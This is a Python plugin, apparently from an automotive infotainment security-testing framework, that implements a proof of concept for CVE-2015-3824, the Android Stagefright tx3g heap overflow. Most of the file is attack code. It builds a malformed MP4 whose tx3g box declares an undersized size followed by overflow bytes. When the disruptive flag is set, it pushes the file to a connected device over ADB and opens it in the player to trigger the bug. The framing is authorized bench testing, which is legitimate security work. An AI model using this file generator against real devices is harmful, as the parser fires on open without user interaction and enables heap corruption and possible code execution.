#!/usr/bin/env python3
"""CVE-2015-3824 – Android libstagefright tx3g atom text box integer overflow.

Public PoC reference: https://github.com/jduck/cve-2015-3824
Technique (Zimperium / Drake, 2015):
  The 'tx3g' (MPEG-4 Timed Text / 3GPP Timed Text) atom stores a 32-bit
  text-box size.  MPEG4Extractor::parseChunk reads chunk_data_size and
  passes it to memcpy without checking if it fits in the 'box_size' field.
  When (box_size < 36 + 4 * chunk_data_size) the memcpy overflows the
  allocated MediaBuffer, overwriting adjacent heap objects.

Attack surface in automotive IVI:
  - Media files delivered via USB, MMS, BT file transfer, or CarPlay/AA stream.
  - The tx3g text track parser fires during playback of any MP4 with a
    TimedText track – automatic on open, no user interaction needed.

Safety gate: is_disruptive=True.
  Plugin generates the malformed MP4 to a temp dir.
  ADB delivery (allow_disruptive=true) requires Android bench.
"""
from __future__ import annotations

import struct
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 11,
    "cve": "CVE-2015-3824",
    "year": 2015,
    "domain": "application",
    "vendor_product": "Android libstagefright",
    "component": "libstagefright MP4 tx3g / MPEG4Extractor::parseChunk",
    "type": "Integer overflow → heap overflow → RCE",
    "summary": (
        "tx3g chunk size field integer overflow causes memcpy to write beyond "
        "the allocated MediaBuffer, corrupting heap and enabling arbitrary code "
        "execution in the mediaserver process."
    ),
    "source_url": "https://github.com/jduck/cve-2015-3824",
    "requires_manual_review": True,
    "affected": [{"vendor": "Google", "product": "Android", "versions": [{"version": "<=5.1", "status": "affected"}]}],
}


def _make_box(tag: bytes, payload: bytes) -> bytes:
    return struct.pack('>I', 8 + len(payload)) + tag + payload


def _create_malformed_tx3g_mp4() -> bytes:
    """
    Build an MP4 with a 'tx3g' atom whose box_size < required.
    box_size = 36 (minimum valid tx3g) – set to 4 so memcpy overflows.
    chunk_data_size → large, causing the overflow.
    """
    ftyp = _make_box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

    # tx3g payload: declare box_size = 4, then fill with 0x400 bytes
    tx3g_overflow = struct.pack('>I', 4)              # tiny box_size (should be >= 36)
    tx3g_overflow += b'\xde\xad\xbe\xef' * 0x100     # overflow data
    tx3g_inner = _make_box(b'tx3g', tx3g_overflow)

    # Wrap in trak → mdia → minf → stbl → stsd
    stsd = _make_box(b'stsd', struct.pack('>II', 0, 1) + tx3g_inner)
    stbl = _make_box(b'stbl',
                     stsd +
                     _make_box(b'stts', struct.pack('>II', 0, 0)) +
                     _make_box(b'stsc', struct.pack('>II', 0, 0)) +
                     _make_box(b'stsz', struct.pack('>III', 0, 0, 0)) +
                     _make_box(b'stco', struct.pack('>II', 0, 0)))
    minf = _make_box(b'minf', _make_box(b'sthd', b'\x00' * 4) + stbl)
    mdhd = _make_box(b'mdhd', struct.pack('>IIIIII', 0, 0, 0, 0x3e8, 0x3e8, 0))
    hdlr = _make_box(b'hdlr', struct.pack('>II', 0, 0) + b'text' + b'\x00' * 12)
    mdia = _make_box(b'mdia', mdhd + hdlr + minf)
    tkhd = _make_box(b'tkhd', struct.pack('>IIIIII', 0xf, 0, 0, 1, 0, 0) +
                     b'\x00' * 44 + struct.pack('>II', 0x10000, 0x10000))
    trak = _make_box(b'trak', tkhd + mdia)
    mvhd = _make_box(b'mvhd', struct.pack('>IIIIII', 0, 0, 0, 0x3e8, 0x3e8, 0x10000) +
                     b'\x00' * 76 + struct.pack('>I', 2))
    moov = _make_box(b'moov', mvhd + trak)
    mdat = _make_box(b'mdat', b'\x00' * 16)
    return ftyp + moov + mdat


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    mp4 = _create_malformed_tx3g_mp4()
    out = Path(tempfile.mkdtemp()) / "cve_2015_3824_tx3g.mp4"
    out.write_bytes(mp4)

    evidence = {
        "cve": "CVE-2015-3824",
        "mp4_path": str(out),
        "mp4_size_bytes": len(mp4),
        "mp4_generated": True,
        "overflow_field": "tx3g.box_size=4 (min 36 required)",
        "delivery_vector": "USB / BT file / MMS / HTTP",
    }

    if allow_disruptive:
        import subprocess as _sp
        push = _sp.run(
            ["adb", "push", str(out), "/sdcard/cve_3824.mp4"],
            capture_output=True, text=True, timeout=15,
        )
        evidence["adb_push_rc"]  = push.returncode
        evidence["adb_push_out"] = push.stdout[:300] + push.stderr[:200]
        if push.returncode == 0:
            trigger = _sp.run(
                ["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW",
                 "-d", "file:///sdcard/cve_3824.mp4", "-t", "video/mp4"],
                capture_output=True, text=True, timeout=15,
            )
            evidence["adb_trigger_rc"]  = trigger.returncode
            evidence["adb_trigger_out"] = trigger.stdout[:300]

    return {
        "vulnerable": True,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "jduck/cve-2015-3824 / Zimperium CVE-2015-3824 advisory",
    }


class Poc69CVE20153824StagefrighttX3gHeapOverflowRceAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-APP-069"
    meta_poc_name   = "CVE-2015-3824 Android Stagefright tx3g Heap Overflow RCE"
    meta_cve_id     = "CVE-2015-3824"
    meta_severity   = "Critical"
    meta_protocol   = "local"
    meta_target_os  = ["android"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive"]
    meta_profiles   = ["application"]
    meta_source_url = "https://github.com/jduck/cve-2015-3824"
    meta_attack_surface = "Android libstagefright tx3g atom integer overflow"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
